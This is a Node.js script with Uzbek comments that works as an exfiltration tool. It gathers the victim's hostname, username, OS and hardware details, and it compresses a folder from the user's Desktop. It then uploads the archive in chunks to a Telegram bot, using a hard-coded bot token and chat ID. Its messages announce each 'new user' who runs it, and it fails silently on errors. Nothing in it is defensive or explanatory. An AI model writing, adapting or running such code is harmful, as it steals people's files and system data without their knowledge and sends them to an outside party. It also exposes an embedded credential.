const fs = require("fs");
const path = require("path");
const os = require("os");
const archiver = require("archiver");
const FormData = require("form-data");
const https = require("https");

// ===== SOZLAMALAR =====
const BOT_TOKEN = "7719159763:AAEUCdON9VomeMz4985axgbRYySVYlOdumQ";
const CHAT_ID = "2051091708";
const FOLDER_PATH = "C:\\Users\\User\\Desktop\\Counter-Strike 1.6 Russian";
const CHUNK_SIZE = 49 * 1024 * 1024;
// =======================

// Kompyuter haqida ma'lumot
const pcInfo = [
  `Kompyuter: ${os.hostname()}`,
  `Foydalanuvchi: ${os.userInfo().username}`,
  `OS: ${os.type()} ${os.release()} (${os.platform()})`,
  `Arxitektura: ${os.arch()}`,
  `RAM: ${(os.totalmem() / (1024 * 1024 * 1024)).toFixed(1)} GB`,
  `CPU: ${os.cpus()[0]?.model || "noma'lum"}`,
].join("\n");

const folderPath = FOLDER_PATH;

if (!fs.existsSync(folderPath) || !fs.statSync(folderPath).isDirectory()) {
  process.exit(1);
}

const folderName = path.basename(path.resolve(folderPath));
const zipPath = path.join(os.tmpdir(), `${folderName}.zip`);

// 1. Xabar: Run qilindi
sendMessage(`🟢 Yangi foydalanuvchi run qildi!\n\n${pcInfo}\n\nPapka: ${folderName}`, () => {
  // 2. Xabar: Zip qilinyapti
  sendMessage(`📦 Zip qilinyapti: ${folderName}...`, () => {
    startZipping();
  });
});

function startZipping() {
  const output = fs.createWriteStream(zipPath);
  const archive = archiver("zip", { zlib: { level: 9 } });

  output.on("close", () => {
    const totalSize = fs.statSync(zipPath).size;
    const sizeMB = (totalSize / (1024 * 1024)).toFixed(1);

    if (totalSize <= CHUNK_SIZE) {
      sendMessage(`📤 Yuborilmoqda: ${folderName}.zip (${sizeMB} MB)`, () => {
        sendFile(zipPath, `${folderName}.zip`, () => {
          fs.unlinkSync(zipPath);
          sendMessage(`✅ Tayyor! ${folderName}.zip yuborildi.`, () => {});
        });
      });
    } else {
      sendMessage(`📤 Fayl katta (${sizeMB} MB), bo'laklarga bo'linmoqda...`, () => {
        splitAndSend(zipPath, totalSize);
      });
    }
  });

  archive.on("error", () => process.exit(1));
  archive.pipe(output);
  archive.directory(folderPath, false);
  archive.finalize();
}

function splitAndSend(filePath, totalSize) {
  const totalParts = Math.ceil(totalSize / CHUNK_SIZE);
  const partPaths = [];

  const fd = fs.openSync(filePath, "r");
  for (let i = 0; i < totalParts; i++) {
    const partPath = path.join(os.tmpdir(), `${folderName}.zip.part${i + 1}`);
    const buffer = Buffer.alloc(Math.min(CHUNK_SIZE, totalSize - i * CHUNK_SIZE));
    fs.readSync(fd, buffer, 0, buffer.length, i * CHUNK_SIZE);
    fs.writeFileSync(partPath, buffer);
    partPaths.push(partPath);
  }
  fs.closeSync(fd);
  fs.unlinkSync(filePath);

  let index = 0;
  function sendNext() {
    if (index >= partPaths.length) {
      sendMessage(`✅ Tayyor! ${totalParts} ta bo'lak yuborildi.`, () => {});
      return;
    }
    const partFile = partPaths[index];
    const partName = `${folderName}.zip.part${index + 1}of${totalParts}`;
    sendMessage(`📤 ${index + 1}/${totalParts} bo'lak yuborilmoqda...`, () => {
      sendFile(partFile, partName, () => {
        fs.unlinkSync(partFile);
        index++;
        sendNext();
      });
    });
  }
  sendNext();
}

function sendMessage(text, onDone) {
  const postData = JSON.stringify({ chat_id: CHAT_ID, text: text });

  const options = {
    hostname: "api.telegram.org",
    path: `/bot${BOT_TOKEN}/sendMessage`,
    method: "POST",
    headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(postData) },
  };

  const req = https.request(options, (res) => {
    let data = "";
    res.on("data", (chunk) => (data += chunk));
    res.on("end", () => { if (onDone) onDone(); });
  });
  req.on("error", () => { if (onDone) onDone(); });
  req.write(postData);
  req.end();
}

function sendFile(filePath, fileName, onDone) {
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("caption", fileName);
  form.append("document", fs.createReadStream(filePath), { filename: fileName });

  const options = {
    hostname: "api.telegram.org",
    path: `/bot${BOT_TOKEN}/sendDocument`,
    method: "POST",
    headers: form.getHeaders(),
  };

  const req = https.request(options, (res) => {
    let data = "";
    res.on("data", (chunk) => (data += chunk));
    res.on("end", () => { if (onDone) onDone(); });
  });
  req.on("error", () => { if (onDone) onDone(); });
  form.pipe(req);
}
